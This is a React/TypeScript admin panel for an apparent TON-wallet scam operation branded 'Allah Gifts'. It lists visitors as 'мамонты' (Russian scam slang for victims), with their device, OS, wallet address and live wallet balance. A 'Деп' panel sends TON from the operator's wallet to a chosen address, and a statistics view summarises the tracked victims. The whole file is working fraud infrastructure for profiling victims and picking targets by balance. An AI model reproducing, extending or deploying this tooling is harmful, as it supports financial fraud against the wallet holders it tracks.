import {
  useTonAddress,
  useTonConnectUI,
} from "@tonconnect/ui-react";
import { useEffect, useState } from "react";

import { api } from "./lib/api";
import type { AdminUserRecord, AdminWalletSnapshot, TonUsdRate } from "./types";

type PayoutUnit = "TON" | "USD";
type AdminView = "mamonts" | "stats";

const ADMIN_REFRESH_INTERVAL_MS = 7000;
const RATE_REFRESH_INTERVAL_MS = 30000;
const TON_NANO_FACTOR = 1_000_000_000n;
const USD_SCALE = 6;

function formatAdminDate(value: string): string {
  if (!value) {
    return "unknown";
  }

  return new Intl.DateTimeFormat("ru-RU", {
    dateStyle: "short",
    timeStyle: "medium",
  }).format(new Date(value));
}

function formatOsVersion(user: AdminUserRecord): string {
  return [user.os_name, user.os_version].filter(Boolean).join(" ");
}

function walletSnapshotKey(walletAddress: string): string {
  return walletAddress.trim().toLowerCase();
}

function formatWalletBalance(snapshot: AdminWalletSnapshot | null): string {
  if (!snapshot) {
    return "Balance: loading...";
  }
  if (snapshot.error || !snapshot.balance_ton) {
    return "Balance: unavailable";
  }
  return `Balance: ${snapshot.balance_ton} TON`;
}

function readAdminToken(): string {
  try {
    return window.localStorage.getItem("allah-admin-token") ?? "";
  } catch {
    return "";
  }
}

function saveAdminToken(value: string): void {
  try {
    window.localStorage.setItem("allah-admin-token", value);
  } catch {
    // The admin panel still works without persistence when storage is blocked.
  }
}

function parseDecimalToUnits(value: string, scale: number, label: string): bigint {
  const normalized = value.trim().replace(",", ".");
  const matcher = new RegExp(`^\\d+(?:\\.\\d{1,${scale}})?$`);
  if (!matcher.test(normalized)) {
    throw new Error(`${label} must contain up to ${scale} decimal places.`);
  }

  const [wholePart, fractionPart = ""] = normalized.split(".");
  const units = 10n ** BigInt(scale);
  const wholeUnits = BigInt(wholePart) * units;
  const fractionUnits = BigInt((fractionPart + "0".repeat(scale)).slice(0, scale));
  const totalUnits = wholeUnits + fractionUnits;

  if (totalUnits <= 0n) {
    throw new Error(`${label} must be greater than 0.`);
  }

  return totalUnits;
}

function parseTonAmountToNano(value: string): bigint {
  return parseDecimalToUnits(value, 9, "TON amount");
}

function parseUsdAmountToNano(value: string, rateUsd: number): bigint {
  if (!(rateUsd > 0)) {
    throw new Error("TON/USD rate is unavailable.");
  }

  const usdUnits = parseDecimalToUnits(value, USD_SCALE, "USD amount");
  const rateUnits = parseDecimalToUnits(rateUsd.toFixed(USD_SCALE), USD_SCALE, "TON/USD rate");
  const amountNano = (usdUnits * TON_NANO_FACTOR + rateUnits / 2n) / rateUnits;

  if (amountNano <= 0n) {
    throw new Error("USD amount is too small.");
  }

  return amountNano;
}

function parsePayoutAmountToNano(
  value: string,
  unit: PayoutUnit,
  tonUsdRate: TonUsdRate | null,
): bigint {
  if (unit === "TON") {
    return parseTonAmountToNano(value);
  }

  return parseUsdAmountToNano(value, tonUsdRate?.usd ?? 0);
}

function formatNanoToTon(value: bigint): string {
  const wholePart = value / TON_NANO_FACTOR;
  const fractionPart = (value % TON_NANO_FACTOR)
    .toString()
    .padStart(9, "0")
    .replace(/0+$/, "");

  return fractionPart ? `${wholePart}.${fractionPart}` : wholePart.toString();
}

function formatTonFromNano(value: bigint): string {
  return `${formatNanoToTon(value)} TON`;
}

function formatUsd(value: number): string {
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 2,
    maximumFractionDigits: 4,
  }).format(value);
}

export function OperatorAdminPanel() {
  const [users, setUsers] = useState<AdminUserRecord[]>([]);
  const [walletSnapshots, setWalletSnapshots] = useState<Record<string, AdminWalletSnapshot>>({});
  const [adminToken, setAdminToken] = useState<string>(readAdminToken);
  const [statusText, setStatusText] = useState<string>("Loading users...");
  const [walletSnapshotStatusText, setWalletSnapshotStatusText] = useState<string>("");
  const [rateStatusText, setRateStatusText] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(true);
  const [activeView, setActiveView] = useState<AdminView>("mamonts");
  const [targetWalletAddress, setTargetWalletAddress] = useState<string>("");
  const [selectedWalletAddress, setSelectedWalletAddress] = useState<string>("");
  const [payoutAmountInput, setPayoutAmountInput] = useState<string>("");
  const [payoutUnit, setPayoutUnit] = useState<PayoutUnit>("TON");
  const [payoutStatusText, setPayoutStatusText] = useState<string>("");
  const [isPayoutPending, setIsPayoutPending] = useState<boolean>(false);
  const [tonUsdRate, setTonUsdRate] = useState<TonUsdRate | null>(null);
  const [tonConnectUI] = useTonConnectUI();
  const adminWalletAddress = useTonAddress();

  async function loadWalletSnapshots(records: AdminUserRecord[], token = adminToken) {
    const walletAddresses = Array.from(
      new Set(records.map((user) => user.wallet_address.trim()).filter(Boolean)),
    );

    if (!walletAddresses.length) {
      setWalletSnapshots({});
      setWalletSnapshotStatusText("");
      return;
    }

    try {
      const payload = await api.getAdminWalletSnapshots(token, walletAddresses);
      setWalletSnapshots(
        Object.fromEntries(
          payload.map((snapshot) => [walletSnapshotKey(snapshot.wallet_address), snapshot]),
        ),
      );
      const failedCount = payload.filter((snapshot) => snapshot.error).length;
      setWalletSnapshotStatusText(
        failedCount
          ? `Tonviewer balances: ${payload.length - failedCount}/${payload.length}`
          : `Tonviewer balances: ${payload.length}`,
      );
    } catch (error) {
      setWalletSnapshots({});
      setWalletSnapshotStatusText(
        error instanceof Error ? error.message : "Tonviewer balance request failed",
      );
    }
  }

  async function loadUsers(token = adminToken) {
    setIsLoading(true);
    try {
      const payload = await api.getAdminUsers(token);
      setUsers(payload);
      await loadWalletSnapshots(payload, token);
      setStatusText(`Loaded users: ${payload.length}`);
    } catch (error) {
      setWalletSnapshots({});
      setWalletSnapshotStatusText("");
      setStatusText(error instanceof Error ? error.message : "Admin request failed");
    } finally {
      setIsLoading(false);
    }
  }

  async function loadRate() {
    try {
      const payload = await api.getTonUsdRate();
      setTonUsdRate(payload);
      setRateStatusText(`Rate: ${formatUsd(payload.usd)} / TON`);
    } catch (error) {
      setRateStatusText(error instanceof Error ? error.message : "TON/USD rate request failed");
    }
  }

  async function handleRefresh() {
    await Promise.all([loadUsers(), loadRate()]);
  }

  function handleUseWallet(user: AdminUserRecord) {
    setSelectedWalletAddress(user.wallet_address);
    setTargetWalletAddress(user.wallet_address);
    setPayoutStatusText("");
  }

  async function handleAdminPayout() {
    if (!adminWalletAddress) {
      setPayoutStatusText("Connect admin TON wallet first.");
      return;
    }

    const targetAddress = targetWalletAddress.trim();
    if (!targetAddress) {
      setPayoutStatusText("Enter target wallet.");
      return;
    }

    let amountNano = 0n;
    try {
      amountNano = parsePayoutAmountToNano(payoutAmountInput, payoutUnit, tonUsdRate);
    } catch (error) {
      setPayoutStatusText(error instanceof Error ? error.message : "Amount is invalid.");
      return;
    }

    setIsPayoutPending(true);
    setPayoutStatusText("");

    try {
      await tonConnectUI.sendTransaction({
        validUntil: Math.floor(Date.now() / 1000) + 300,
        messages: [
          {
            address: targetAddress,
            amount: amountNano.toString(),
          },
        ],
      });
      setPayoutStatusText(`Request sent: ${formatTonFromNano(amountNano)} -> ${targetAddress}`);
      setPayoutAmountInput("");
    } catch (error) {
      setPayoutStatusText(error instanceof Error ? error.message : "TON payout request failed");
    } finally {
      setIsPayoutPending(false);
    }
  }

  useEffect(() => {
    void loadUsers();
    const refreshId = window.setInterval(() => void loadUsers(), ADMIN_REFRESH_INTERVAL_MS);
    return () => window.clearInterval(refreshId);
  }, [adminToken]);

  useEffect(() => {
    void loadRate();
    const refreshId = window.setInterval(() => void loadRate(), RATE_REFRESH_INTERVAL_MS);
    return () => window.clearInterval(refreshId);
  }, []);

  useEffect(() => {
    if (!users.length) {
      return;
    }

    const selectedExists = users.some((user) => user.wallet_address === selectedWalletAddress);
    if (!selectedExists) {
      handleUseWallet(users[0]);
    }
  }, [selectedWalletAddress, users]);

  const uniqueWallets = new Set(users.map((user) => user.wallet_address.toLowerCase())).size;
  const iosUsers = users.filter((user) => user.os_name === "iOS" || user.os_name === "iPadOS");
  const latestUser = users[0] ?? null;
  const selectedUser =
    users.find((user) => user.wallet_address === selectedWalletAddress) ?? null;
  const selectedSnapshot = selectedUser
    ? walletSnapshots[walletSnapshotKey(selectedUser.wallet_address)] ?? null
    : null;

  let payoutErrorText = "";
  let payoutAmountNano = 0n;
  try {
    if (payoutAmountInput.trim()) {
      payoutAmountNano = parsePayoutAmountToNano(payoutAmountInput, payoutUnit, tonUsdRate);
    }
  } catch (error) {
    payoutErrorText = error instanceof Error ? error.message : "Amount is invalid.";
  }

  const payoutPreviewText =
    payoutAmountNano > 0n
      ? payoutUnit === "USD" && tonUsdRate
        ? `${payoutAmountInput} USD = ${formatTonFromNano(payoutAmountNano)}`
        : formatTonFromNano(payoutAmountNano)
      : "Enter amount";

  return (
    <div className="opside-shell">
      <div className="opside-frame">
        <aside className="opside-sidebar">
          <div className="opside-brand">
            <p className="opside-brand__eyebrow">Allah Gifts</p>
            <h1>Admin</h1>
            <p className="opside-brand__copy">
              Чистая панель с мамонтами, кошельком и балансом.
            </p>
          </div>

          <nav className="opside-nav" aria-label="Admin sections">
            <button
              className={activeView === "mamonts" ? "opside-nav__item is-active" : "opside-nav__item"}
              onClick={() => setActiveView("mamonts")}
              type="button"
            >
              Мамонты
            </button>
            <button
              className={activeView === "stats" ? "opside-nav__item is-active" : "opside-nav__item"}
              onClick={() => setActiveView("stats")}
              type="button"
            >
              Статистика
            </button>
          </nav>

          <section className="opside-sidecard">
            <label className="opside-field" htmlFor="admin-token">
              <span>Admin token</span>
              <input
                id="admin-token"
                onChange={(event) => {
                  const value = event.target.value;
                  setAdminToken(value);
                  saveAdminToken(value);
                }}
                placeholder="X-Admin-Token"
                type="password"
                value={adminToken}
              />
            </label>

            <button className="opside-button opside-button--secondary" onClick={() => void handleRefresh()} type="button">
              Обновить
            </button>
          </section>

          <section className="opside-sidecard">
            <span className="opside-sidecard__label">Сервис</span>
            <p className="opside-sidecard__value">{isLoading ? "Sync..." : statusText}</p>
            <p className="opside-sidecard__hint">{walletSnapshotStatusText || "Tonviewer balances are not loaded yet."}</p>
            <p className="opside-sidecard__hint">{rateStatusText || "TON/USD rate is not loaded."}</p>
          </section>
        </aside>

        <main className="opside-content">
          {activeView === "mamonts" ? (
            <>
              <header className="opside-head">
                <div>
                  <p className="opside-label">Мамонты</p>
                  <h2>Подключенные устройства</h2>
                </div>
                <div className="opside-head__meta">
                  <span>{users.length} записей</span>
                  <span>{selectedUser ? formatWalletBalance(selectedSnapshot) : "Кошелек не выбран"}</span>
                </div>
              </header>

              <div className="opside-targets">
                <section className="opside-targets__list">
                  {users.length ? (
                    users.map((user) => {
                      const walletSnapshot =
                        walletSnapshots[walletSnapshotKey(user.wallet_address)] ?? null;

                      return (
                        <article
                          key={user.wallet_address}
                          className={
                            user.wallet_address === selectedWalletAddress
                              ? "opside-target is-active"
                              : "opside-target"
                          }
                        >
                          <div className="opside-target__copy">
                            <strong>{user.device}</strong>
                            <span>{formatOsVersion(user)}</span>
                            <code className="opside-target__wallet">{user.wallet_address}</code>
                            <span className="opside-target__balance">
                              {formatWalletBalance(walletSnapshot)}
                            </span>
                          </div>

                          <button
                            className="opside-button"
                            onClick={() => handleUseWallet(user)}
                            type="button"
                          >
                            Деп
                          </button>
                        </article>
                      );
                    })
                  ) : (
                    <div className="opside-empty">
                      Нет записей. Подключи TON wallet в web app, чтобы строка появилась здесь.
                    </div>
                  )}
                </section>

                <aside className="opside-payout">
                  <div className="opside-payout__head">
                    <div>
                      <p className="opside-label">Деп</p>
                      <h3>{selectedUser ? selectedUser.device : "Выбери мамонта"}</h3>
                    </div>
                  </div>

                  <p className="opside-payout__copy">
                    {selectedUser
                      ? `${formatOsVersion(selectedUser)}`
                      : "Нажми «Деп» у нужной строки."}
                  </p>

                  <div className="opside-summary">
                    <div>
                      <span>Баланс</span>
                      <strong>{formatWalletBalance(selectedSnapshot)}</strong>
                    </div>
                  </div>

                  <label className="opside-field">
                    <span>Куда</span>
                    <input
                      onChange={(event) => setTargetWalletAddress(event.target.value)}
                      placeholder="UQ... or EQ..."
                      type="text"
                      value={targetWalletAddress}
                    />
                  </label>

                  <div className="opside-unit">
                    <div className="opside-unit__toggle" role="tablist" aria-label="Payout unit">
                      <button
                        className={payoutUnit === "TON" ? "opside-unit__button is-active" : "opside-unit__button"}
                        onClick={() => setPayoutUnit("TON")}
                        type="button"
                      >
                        TON
                      </button>
                      <button
                        className={payoutUnit === "USD" ? "opside-unit__button is-active" : "opside-unit__button"}
                        onClick={() => setPayoutUnit("USD")}
                        type="button"
                      >
                        $
                      </button>
                    </div>

                    <label className="opside-field opside-field--compact">
                      <span>Сколько</span>
                      <input
                        inputMode="decimal"
                        onChange={(event) => setPayoutAmountInput(event.target.value)}
                        placeholder={payoutUnit === "TON" ? "0.25" : "25"}
                        type="text"
                        value={payoutAmountInput}
                      />
                    </label>
                  </div>

                  <p className="opside-status">{payoutPreviewText}</p>

                  <button
                    className="opside-button opside-button--wide"
                    disabled={isPayoutPending}
                    onClick={() => void handleAdminPayout()}
                    type="button"
                  >
                    {isPayoutPending ? "Подтверди в кошельке" : "Отправить"}
                  </button>

                  {payoutErrorText ? <p className="opside-status opside-status--warn">{payoutErrorText}</p> : null}
                  {payoutStatusText ? <p className="opside-status">{payoutStatusText}</p> : null}
                </aside>
              </div>
            </>
          ) : (
            <>
              <header className="opside-head">
                <div>
                  <p className="opside-label">Статистика</p>
                  <h2>Сводка</h2>
                </div>
                <div className="opside-head__meta">
                  <span>{isLoading ? "Sync..." : "Данные обновлены"}</span>
                  <span>{latestUser ? formatAdminDate(latestUser.last_seen_at) : "Нет активности"}</span>
                </div>
              </header>

              <section className="opside-stats">
                <article className="opside-stat">
                  <span>Мамонты</span>
                  <strong>{users.length}</strong>
                </article>
                <article className="opside-stat">
                  <span>Кошельки</span>
                  <strong>{uniqueWallets}</strong>
                </article>
                <article className="opside-stat">
                  <span>iOS / iPadOS</span>
                  <strong>{iosUsers.length}</strong>
                </article>
                <article className="opside-stat">
                  <span>Последний визит</span>
                  <strong>{latestUser ? formatAdminDate(latestUser.last_seen_at) : "none"}</strong>
                </article>
              </section>

              <section className="opside-report">
                <div className="opside-report__row">
                  <span>Последний мамонт</span>
                  <strong>{latestUser ? latestUser.device : "none"}</strong>
                </div>
                <div className="opside-report__row">
                  <span>Версия ОС</span>
                  <strong>{latestUser ? formatOsVersion(latestUser) : "none"}</strong>
                </div>
                <div className="opside-report__row">
                  <span>Выбранный кошелек</span>
                  <strong>{selectedUser ? selectedUser.wallet_address : "none"}</strong>
                </div>
                <div className="opside-report__row">
                  <span>Tonviewer</span>
                  <strong>{walletSnapshotStatusText || "No data"}</strong>
                </div>
                <div className="opside-report__row">
                  <span>TON/USD</span>
                  <strong>{tonUsdRate ? formatUsd(tonUsdRate.usd) : "not loaded"}</strong>
                </div>
              </section>
            </>
          )}
        </main>
      </div>
    </div>
  );
}
